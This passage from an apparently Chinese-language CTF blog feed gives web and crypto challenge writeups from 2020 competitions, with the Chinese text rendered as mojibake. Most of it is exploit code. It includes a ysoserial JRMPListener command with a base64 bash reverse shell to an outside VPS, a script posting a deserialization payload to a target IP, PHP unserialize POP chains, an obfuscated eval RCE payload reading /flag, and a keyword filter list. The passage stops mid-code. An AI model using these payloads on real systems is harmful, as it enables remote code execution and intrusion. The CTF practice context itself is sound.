<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stripos($data, <span class="string">'`'</span>)  === <span class="keyword">false</span> 		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'ll'</span>)  === <span class="keyword">false</span> 	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'PD8'</span>)  === <span class="keyword">false</span>   	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'-'</span>)  === <span class="keyword">false</span>		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'ww'</span>)  === <span class="keyword">false</span> 	&amp;&amp; </span><br><span class="line">stripos($data, <span class="string">'6'</span>)  === <span class="keyword">false</span>		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'7'</span>)  === <span class="keyword">false</span>		&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'rm'</span>)  === <span class="keyword">false</span> 	&amp;&amp; </span><br><span class="line">stripos($data, <span class="string">'mr'</span>)  === <span class="keyword">false</span> 	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'sy'</span>)  === <span class="keyword">false</span> 	&amp;&amp;</span><br><span class="line">stripos($data, <span class="string">'ys'</span>)  === <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¿™äº›è¿‡æ»¤ã€‚</p>
<h1 id="0x02-dice2cry"><a href="#0x02-dice2cry" class="headerlink" title="0x02 dice2cry"></a>0x02 dice2cry</h1><p>é¢˜ç›®æ³„éœ²äº†æºç ï¼Œabi.php.bak</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">        $data = json_decode($json_string, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        $rand_number = <span class="keyword">isset</span>($_POST[<span class="string">'this_is.able'</span>]) ? $_POST[<span class="string">'this_is.able'</span>] : mt_rand();</span><br><span class="line">        $n = gmp_init($data[<span class="string">'n'</span>]);</span><br><span class="line">        $d = gmp_init($data[<span class="string">'d'</span>]);</span><br><span class="line">        $c = gmp_init($rand_number);</span><br><span class="line">        $m = gmp_powm($c,$d,$n);</span><br><span class="line">        $v3 = gmp_init(<span class="string">'3'</span>);</span><br><span class="line">        $r = gmp_mod($m,$v3);</span><br><span class="line">        $result=(int)gmp_strval($r);</span><br><span class="line">        $dice = <span class="keyword">array</span>(<span class="string">"num"</span>=&gt;$result);</span><br><span class="line">        $json_obj = json_encode($dice);</span><br><span class="line">        <span class="keyword">echo</span> $json_obj;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªtrickï¼Œå› ä¸ºphpå˜é‡çš„åŸå› ï¼Œå¦‚æœPOSTæˆ–GETä¼ çš„å‚æ•°åŒ…å«<code>&#39;.&#39; &#39;[&#39; &#39;+&#39; &#39; &#39;</code>ä¼šè½¬æ¢æˆ<code>_</code>ï¼Œ</p>
<p><a href="https://www.anquanke.com/post/id/181682" target="_blank" rel="noopener">å¦‚ä½•æ»¥ç”¨PHPå­—ç¬¦ä¸²è§£æå‡½æ•°ç»•è¿‡IDSã€IPSåŠWAF</a></p>
<p>ç”¨<code>this[is.able</code>å‘æœåŠ¡å™¨ä¼ å€¼ï¼ŒæœåŠ¡å™¨å°±å¯ä»¥å°†å€¼èµ‹ç»™<code>$_POST[&#39;this_is.able&#39;]</code>ï¼Œç„¶åæ¥ä¸‹æ¥å°±æ˜¯å¯†ç å­¦äº†ï¼Œå¯ä»¥åœ¨cookieä¸­å‘ç°ç»™äº†N ã€då’ŒåŠ å¯†çš„flagï¼Œæˆ‘ä»¬å¯ä»¥å‘æœåŠ¡å™¨å‘é€ä»»æ„å¯†æ–‡ï¼ŒæœåŠ¡å™¨è¿”å›å¯¹åº”å¯†æ–‡è§£å¯†çš„ç»“æœæ¨¡3çš„å€¼ï¼Œä¹‹å‰çš„RSA LSB ORACLEæ”»å‡»æ˜¯åˆ©ç”¨æ¨¡2æ¥äºŒåˆ†æœ€ç»ˆå¾—åˆ°mçš„å€¼ï¼Œæœ¬é¢˜ç”¨çš„æ˜¯æ¨¡3,</p>
<h1 id="0x03-easy-java"><a href="#0x03-easy-java" class="headerlink" title="0x03 easy_java"></a>0x03 easy_java</h1><p>é¢˜ç›®ç»™äº†æºç ï¼Œ</p>
<p><a href="https://mount4in.github.io/2020/03/10/é«˜æ ¡æˆ˜" ç–«"ç½‘ç»œå®‰å…¨åˆ†äº«èµ›éƒ¨åˆ†èµ›é¢˜å¤ç° #0x02-baby-java">é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›éƒ¨åˆ†èµ›é¢˜å¤ç°</a></p>
<blockquote>
<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200823215753040.png" alt="image-20200823215753040"></p>
</blockquote>
<p>æ”¾åˆ°ideaå¯ä»¥è¿è¡Œï¼Œæœ¬åœ°é‡‡ç”¨jdk8u102ç‰ˆæœ¬å¯ä»¥æˆåŠŸï¼Œä½†ä½¿ç”¨jdk8u261ä¸èƒ½æˆåŠŸã€‚</p>
<p>ç”±äºé¢˜ç›®åˆ©ç”¨é»‘åå•è¿‡æ»¤äº†å¾ˆå¤šï¼Œæ‰€ä»¥å°è¯•åˆ©ç”¨JRMPClientç»•è¿‡è¿‡æ»¤ï¼Œå‚è€ƒé«˜æ ¡æˆ˜å½¹çš„baby_javaçš„JRMPListenerè§£æ³•ï¼Œåˆ©ç”¨JRMPListenerã€‚</p>
<p>è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<p>åœ¨å®¢æˆ·ç«¯æ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar JRMPClient 129.204.207.xxx:8888 &gt; jrmpclient.cer</span><br><span class="line">windowsç³»ç»Ÿè¿™æ¡å‘½ä»¤åªèƒ½åœ¨cmdä¸‹è¿è¡Œï¼Œåœ¨powershellè¿è¡Œä¼šä¹±ç ï¼ŒåŸå› æœªçŸ¥</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200903152937979.png" alt="image-20200903152937979"></p>
<p>åœ¨vpsä¸Šæ‰§è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar  ysoserial.exploit.JRMPListener  8888 CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjkxxxxxxxxMTQvOTxxxxYxCg&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶åœ¨vpsä¸Šç›‘å¬50000ç«¯å£ï¼ˆä¸ä¸Šé¢çš„payloadç›¸å¯¹åº”ï¼‰</p>
<p>ç„¶åè®¿é—®<code>/jdk_der</code>è·¯ç”±</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = open(<span class="string">"aa"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</span><br><span class="line">requests.post(<span class="string">"http://39.101.166.142:8080/jdk_der"</span>,data=payload)</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç”¨burpå‘åŒ…</p>
<p>è¿™æ—¶å°±å¯ä»¥åå¼¹shelläº†ã€‚</p>
<p><img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200824095918455.png" alt="image-20200824095918455"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;056eaalfe7scd222qwe2df36845b8ed170c67e23e3&#125;</span><br></pre></td></tr></table></figure>



<h1 id="0x04-çº¢æ–¹è¾…åŠ©"><a href="#0x04-çº¢æ–¹è¾…åŠ©" class="headerlink" title="0x04 çº¢æ–¹è¾…åŠ©"></a>0x04 çº¢æ–¹è¾…åŠ©</h1><p>ç”¨wiresharkæ‰“å¼€</p>
<img src="/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEwriteup/image-20200830171012619.png" alt="image-20200830171012619" style="zoom:150%;">

<p>å¤åˆ¶åˆ°a.txtã€‚</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">f = open(<span class="string">"a.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">f = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2075</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="comment">#print(f[i])</span></span><br><span class="line">    funcs = &#123;</span><br><span class="line">        <span class="string">"0"</span> : <span class="keyword">lambda</span> x, y : x + y,</span><br><span class="line">        <span class="string">"1"</span> : <span class="keyword">lambda</span> x, y : x - y,</span><br><span class="line">        <span class="string">"2"</span> : <span class="keyword">lambda</span> x, y : x ^ y</span><br><span class="line">    &#125;</span><br><span class="line">    offset = &#123;</span><br><span class="line">        <span class="string">"0"</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">"1"</span> : <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">"2"</span> : <span class="number">0xffffff</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    btime = str(f[i+<span class="number">1</span>])</span><br><span class="line">    fn = chr(int(f[i+<span class="number">3</span>][<span class="number">16</span>:<span class="number">18</span>],<span class="number">16</span>))</span><br><span class="line">    salt = int(f[i+<span class="number">3</span>][<span class="number">18</span>:<span class="number">20</span>],<span class="number">16</span>)</span><br><span class="line">    ci = f[i+<span class="number">3</span>][<span class="number">20</span>:]</span><br><span class="line">    <span class="comment">#print(ci) </span></span><br><span class="line">    t = struct.unpack(<span class="string">"&lt;i"</span>, bytes().fromhex(btime))[<span class="number">0</span>]</span><br><span class="line">    boffset = offset[fn]</span><br><span class="line">    t -= boffset</span><br><span class="line">    t = struct.pack(<span class="string">"&lt;i"</span>, t)</span><br><span class="line">    k =<span class="number">0</span></span><br><span class="line">    m = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">244</span>,<span class="number">2</span>):</span><br><span class="line">        c = ci[j:j+<span class="number">2</span>]</span><br><span class="line">        j = j+<span class="number">2</span></span><br><span class="line">        <span class="comment">#print(c)</span></span><br><span class="line">        <span class="keyword">if</span> funcs[fn](int(c,<span class="number">16</span>) , salt) % <span class="number">256</span>  ^ t[k] == <span class="number">10</span>:</span><br><span class="line">        	<span class="keyword">break</span></span><br><span class="line">        <span class="comment">#print((funcs[fn](int(c,16) , salt)^ t[k]))</span></span><br><span class="line">        m += chr(funcs[fn](int(c,<span class="number">16</span>) , salt) % <span class="number">256</span>  ^ t[k])</span><br><span class="line"></span><br><span class="line">        k = (k+<span class="number">1</span>)%<span class="number">4</span></span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ciscn-webé¢˜ç›®writeup</title>
    <url>/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/</url>
    <content><![CDATA[<p>Webè¶Šæ¥è¶Šä¾¿å®œ</p>
<a id="more"></a>

<h1 id="0x01-babyunserialize"><a href="#0x01-babyunserialize" class="headerlink" title="0x01 babyunserialize"></a>0x01 babyunserialize</h1><p>wm2020ctf</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">		<span class="title">protected</span></span><br><span class="line">		//! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">		$<span class="title">db</span>,</span><br><span class="line">		//! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">		$<span class="title">engine</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">source</span>,</span><br><span class="line">		//! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">		$<span class="title">table</span>,</span><br><span class="line">		//! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">		$<span class="title">as</span>,</span><br><span class="line">		//! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">		$<span class="title">_id</span>,</span><br><span class="line">		//! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">fields</span>,</span><br><span class="line">		//! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">		$<span class="title">adhoc</span> = [],</span><br><span class="line">		//! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">		$<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="number">20</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;props[<span class="string">'quotekey'</span>] = <span class="string">"phpinfo"</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">DB</span>\<span class="title">SQL</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">		<span class="keyword">protected</span></span><br><span class="line">		$server,</span><br><span class="line">		$id,</span><br><span class="line">		$socket,</span><br><span class="line">		$flag,</span><br><span class="line">		$verb,</span><br><span class="line">		$uri,</span><br><span class="line">			$headers;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper(), <span class="string">"find"</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">	<span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">	<span class="comment">//print_r(serialize(new WS()));</span></span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize(<span class="keyword">array</span>(<span class="keyword">new</span> WS(), <span class="keyword">new</span> CLI\Agent())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200820212428928.png" alt="image-20200820212428928"></p>
<p>exp2:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            //! <span class="title">PDO</span> <span class="title">wrapper</span></span><br><span class="line">            $<span class="title">db</span>,</span><br><span class="line">            //! <span class="title">Database</span> <span class="title">engine</span></span><br><span class="line">            $<span class="title">engine</span>,</span><br><span class="line">            //! <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">            $<span class="title">source</span>,</span><br><span class="line">            //! <span class="title">SQL</span> <span class="title">table</span> (<span class="title">quoted</span>)</span><br><span class="line">            $<span class="title">table</span>,</span><br><span class="line">            //! <span class="title">Alias</span> <span class="title">for</span> <span class="title">SQL</span> <span class="title">table</span></span><br><span class="line">            $<span class="title">as</span>,</span><br><span class="line">            //! <span class="title">Last</span> <span class="title">insert</span> <span class="title">ID</span></span><br><span class="line">            $<span class="title">_id</span>,</span><br><span class="line">            //! <span class="title">Defined</span> <span class="title">fields</span></span><br><span class="line">            $<span class="title">fields</span>,</span><br><span class="line">            //! <span class="title">Adhoc</span> <span class="title">fields</span></span><br><span class="line">            $<span class="title">adhoc</span> = [],</span><br><span class="line">            //! <span class="title">Dynamic</span> <span class="title">properties</span></span><br><span class="line">            $<span class="title">props</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;adhoc = <span class="keyword">array</span>(<span class="number">20</span> =&gt; [<span class="string">"expr"</span> =&gt; <span class="string">"test"</span>]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;props[<span class="string">'read'</span>] = <span class="string">"phpinfo"</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">DB</span>\<span class="title">Jig</span>\<span class="title">Mapper</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Agent</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span></span><br><span class="line">            $server,</span><br><span class="line">            $id,</span><br><span class="line">            $socket,</span><br><span class="line">            $flag,</span><br><span class="line">            $verb,</span><br><span class="line">            $uri,</span><br><span class="line">            $headers;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server-&gt;events = <span class="keyword">array</span>(<span class="string">"disconnect"</span> =&gt; [<span class="keyword">new</span> Mapper($a), <span class="string">"insert"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span>   &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            //! <span class="title">Flat</span>-<span class="title">file</span> <span class="title">DB</span> <span class="title">wrapper</span></span><br><span class="line">            $<span class="title">db</span>,</span><br><span class="line">            //! <span class="title">Data</span> <span class="title">file</span></span><br><span class="line">            $<span class="title">file</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">identifier</span></span><br><span class="line">            $<span class="title">id</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">contents</span></span><br><span class="line">            $<span class="title">document</span>=[],</span><br><span class="line">            //! <span class="title">field</span> <span class="title">map</span>-<span class="title">reduce</span> <span class="title">handlers</span></span><br><span class="line">            $<span class="title">_reduce</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $a;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="number">20</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">CLI</span>\<span class="title">WS</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="comment">//print_r(serialize(new WS()));</span></span><br><span class="line">    $a= <span class="keyword">new</span> DB\SQL\Mapper();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">array</span>(<span class="keyword">new</span> WS(), <span class="keyword">new</span> CLI\Agent($a))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02-easyphp"><a href="#0x02-easyphp" class="headerlink" title="0x02 easyphp"></a>0x02 easyphp</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<h1 id="pcntl-fork"><a href="#pcntl-fork" class="headerlink" title="pcntl_fork"></a>pcntl_fork</h1><p>(PHP 4 &gt;= 4.1.0, PHP 5, PHP 7)</p>
<p>pcntl_fork â€” åœ¨å½“å‰è¿›ç¨‹å½“å‰ä½ç½®äº§ç”Ÿåˆ†æ”¯ï¼ˆå­è¿›ç¨‹ï¼‰ã€‚è¯‘æ³¨ï¼šforkæ˜¯åˆ›å»ºäº†ä¸€ä¸ªå­è¿›ç¨‹ï¼Œçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ éƒ½ä»forkçš„ä½ç½®å¼€å§‹å‘ä¸‹ç»§ç»­æ‰§è¡Œï¼Œä¸åŒçš„æ˜¯çˆ¶è¿›ç¨‹æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¾—åˆ°çš„forkè¿”å›å€¼ä¸ºå­è¿›ç¨‹ å·ï¼Œè€Œå­è¿›ç¨‹å¾—åˆ°çš„æ˜¯0ã€‚</p>
</blockquote>
<p><a href="https://bugs.php.net/bug.php?id=52173" target="_blank" rel="noopener">phpbug</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?a&#x3D;call_user_func&amp;b&#x3D;pcntl_wait</span><br><span class="line">&#x2F;?a&#x3D;call_user_func&amp;b&#x3D;pcntl_waitpid</span><br></pre></td></tr></table></figure>

<h1 id="0x03-rceme"><a href="#0x03-rceme" class="headerlink" title="0x03 rceme"></a>0x03 rceme</h1><p>å‚è€ƒ<a href="https://xz.aliyun.com/t/6068å’ŒRCTFçš„calc" target="_blank" rel="noopener">https://xz.aliyun.com/t/6068å’ŒRCTFçš„calc</a>,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"((((((1).(5))&#123;1&#125;)^(((1).(0.00001))&#123;4&#125;)).((((1).(0.1))&#123;2&#125;)^(((999**999).(1))&#123;2&#125;)).((((1).(5))&#123;1&#125;)^(((1).(0.00001))&#123;4&#125;)).((((1).(0.1))&#123;2&#125;)^((((1).(0.00001))&#123;4&#125;)|(((999**999).(1))&#123;2&#125;))).((((1).(0.1))&#123;2&#125;)|(((999**999).(1))&#123;1&#125;)).((((999**999).(1))&#123;0&#125;)^((((1).(0.1))&#123;2&#125;)|(((1).(-1))&#123;1&#125;))).((((1).(0.1))&#123;2&#125;)|(((1).(0.00001))&#123;4&#125;))))();//"</span>;</span><br><span class="line"><span class="keyword">eval</span>($str);</span><br><span class="line">$str = <span class="string">"&#123;if:1)"</span> . str_replace(<span class="keyword">array</span>(<span class="string">"&#123;"</span>, <span class="string">"&#125;"</span>), <span class="keyword">array</span>(<span class="string">"["</span>, <span class="string">"]"</span>), $str) . <span class="string">"&#125;&#123;end if&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;if:1)((((((1).(5))[1])^(((1).(0.00001))[4])).((((1).(0.1))[2])^(((999**999).(1))[2])).((((1).(5))[1])^(((1).(0.00001))[4])).((((1).(0.1))[2])^((((1).(0.00001))[4])|(((999**999).(1))[2]))).((((1).(0.1))[2])|(((999**999).(1))[1])).((((999**999).(1))[0])^((((1).(0.1))[2])|(((1).(-1))[1]))).((((1).(0.1))[2])|(((1).(0.00001))[4]))))();&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/21/2020ciscn-web%E9%A2%98%E7%9B%AEwriteup/image-20200820184830765.png" alt="image-20200820184830765"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;eci-2zei1qumnps754gs59g6.cloudeci1.ichunqiu.com&#x2F;?a&#x3D;&#123;if:1) echo &#96;cat &#x2F;flag&#96;;&#x2F;&#x2F;&#125;x&#123;end if&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x04-easytrick"><a href="#0x04-easytrick" class="headerlink" title="0x04 easytrick"></a>0x04 easytrick</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $trick1;</span><br><span class="line">	<span class="keyword">public</span> $trick2;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;trick1 = (string) <span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"ä½ å¤ªé•¿äº†"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2) &#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;trick1 = <span class="string">"INF"</span>;</span><br><span class="line">$a-&gt;trick2 = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $trick1;</span><br><span class="line">	<span class="keyword">public</span> $trick2;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;trick1 = (string) <span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"ä½ å¤ªé•¿äº†"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span 